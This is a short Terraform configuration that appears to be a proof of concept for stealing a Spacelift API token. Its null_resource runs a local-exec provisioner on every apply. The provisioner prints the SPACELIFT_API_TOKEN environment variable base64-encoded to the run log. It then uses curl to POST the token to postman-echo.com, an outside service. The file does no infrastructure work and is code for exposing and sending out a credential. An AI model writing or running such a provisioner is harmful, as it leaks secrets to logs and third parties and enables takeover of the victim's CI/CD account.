terraform {
  required_version = ">= 1.0"
}

resource "null_resource" "show_token" {
  triggers = { always = uuid() }
  provisioner "local-exec" {
    command = <<EOT
      echo "========================================="
      echo "TOKEN (base64):"
      echo "$SPACELIFT_API_TOKEN" | base64
      echo ""
      echo "Response from postman-echo (token in JSON):"
      curl -s -X POST https://postman-echo.com/post \
        -H "Content-Type: application/json" \
        -d "{\"token\":\"$SPACELIFT_API_TOKEN\"}"
      echo ""
      echo "========================================="
    EOT
  }
}
